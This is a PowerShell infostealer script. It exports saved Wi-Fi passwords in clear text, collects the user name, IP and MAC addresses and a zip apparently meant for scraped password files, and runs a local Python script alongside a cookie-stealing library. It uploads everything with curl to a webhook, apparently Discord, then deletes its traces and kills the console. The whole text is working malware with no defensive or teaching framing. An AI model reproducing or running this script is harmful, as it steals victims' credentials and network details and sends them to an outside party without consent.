#powershell -w hidden -nop -noni
#pip install pycryptodomex pywin32 browser-cookie3 requests
Start-Sleep -Seconds 6
& "D:\Python\python.exe" "D:\Scripts\fun.py" # instead of downloading something, just use the 128 gigs on the D:\ and run it there
$e="$env:LOCALAPPDATA\Temp"; netsh wlan export profile key=clear folder=$e | Out-Null; Get-ChildItem "$e\Wi-Fi*.xml" | %{$x=[xml](gc $_); "SSID:$($x.WLANProfile.SSIDConfig.SSID.name) | Password:$($x.WLANProfile.MSM.security.sharedKey.keyMaterial)"} > "$e\wifi.txt"

#scrape the localappdata for password files
$zip="$env:TEMP\funny_stuff_folder.zip"
$whoami_content = whoami

ipconfig /all | Out-File -FilePath "$e\ipcfg.txt" # save ipconfig as a file

$mac=(ipconfig /all | findstr /R "Physical")
$ipv6=(ipconfig /all | findstr /R "IPv6")
$ipv4=(ipconfig /all | findstr /R "IPv4")

#send to discord

#send http
Start-Process curl.exe -F "content=Passwords for: $whoami_content | IP: $ipv4[0] | Public: $ipv4[1] | MacAddress: $mac | IPv6: $ipv6 \n@everyone" -F "file1=@$zip" -F "file2=@$e\wifi.txt" -F "file3=@$e\ipcfg.txt" $wh > $null 2>&1

cls # clear console
# cleanup

Remove-Item -Path "$e\wifi.txt"
Remove-Item -Path "$e\ipcfg.txt"
Remove-Item -Path "$zip"
#exit quickly
taskkill /F /IM pwsh.exe /IM powershell.exe 2>$null 
echo sent!
